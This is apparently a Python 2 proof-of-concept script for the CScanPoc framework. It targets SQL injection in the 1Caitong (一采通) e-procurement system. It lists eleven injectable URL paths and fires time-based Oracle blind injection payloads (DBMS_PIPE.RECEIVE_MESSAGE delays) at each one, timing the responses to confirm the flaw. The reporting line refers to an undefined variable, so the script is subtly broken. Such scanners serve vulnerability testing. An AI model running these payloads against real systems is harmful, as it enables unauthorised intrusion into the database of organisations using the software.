# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    poc_id = 'aa0ff02a-ee4c-4e26-9592-5e0ce15724cb'
    name = ' 一采通电子采购系统 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '	2015-09-06'  # 漏洞公布时间
    desc = '''
        一采通电子采购系统多处SQL注入漏洞：
        /Plan/TitleShow/ApplyInfo.aspx?ApplyID=1
        /Price/AVL/AVLPriceTrends_SQU.aspx?classId=1
        /Price/SuggestList.aspx?priceid=1
        /PriceDetail/PriceComposition_Formula.aspx?indexNum=3&elementId=1
        /Products/Category/CategoryOption.aspx?option=IsStop&classId=1
        /Products/Tiens/CategoryStockView.aspx?id=1
        /custom/CompanyCGList.aspx?ComId=1
        /SuperMarket/InterestInfoDetail.aspx?ItemId=1
        /Orders/k3orderdetail.aspx?FINTERID=1
        /custom/CompanyCGList.aspx?ComId=1
        /custom/GroupNewsList.aspx?child=true&groupId=121
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0117552
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = '1Caitong(一采通)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9234828a-551e-4407-9660-280e17e059ec'
    author = '国光'  # POC编写者
    create_date = '2018-05-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vun_urls=['/Plan/TitleShow/ApplyInfo.aspx?ApplyID=1',
              '/Price/AVL/AVLPriceTrends_SQU.aspx?classId=1',
              '/Price/SuggestList.aspx?priceid=1',
              '/PriceDetail/PriceComposition_Formula.aspx?indexNum=3&elementId=1',
              '/Products/Category/CategoryOption.aspx?option=IsStop&classId=1',
              '/Products/Tiens/CategoryStockView.aspx?id=1',
              '/custom/CompanyCGList.aspx?ComId=1',
              '/SuperMarket/InterestInfoDetail.aspx?ItemId=1',
              '/Orders/k3orderdetail.aspx?FINTERID=1',
              '/custom/CompanyCGList.aspx?ComId=1',
              '/custom/GroupNewsList.aspx?child=true&groupId=121']
            payload0="%20AND%206371=DBMS_PIPE.RECEIVE_MESSAGE(11,0)"
            payload1="%20AND%206371=DBMS_PIPE.RECEIVE_MESSAGE(11,5)"
            for vun_url in vun_urls:
                time0=time.time()
                code1,head,res,errcode,finalurl=hh.http(arg+vun_url+payload1)
                time1=time.time()
                code2,head,res,errcode,finalurl=hh.http(arg+vun_url+payload0)
                time2=time.time()
                if code1!=0 and code2!=0 and ((time1-time0)-(time2-time1))>4:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞,漏洞地址为{url}'.format(target=self.target,name=self.vuln.name,url=url))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()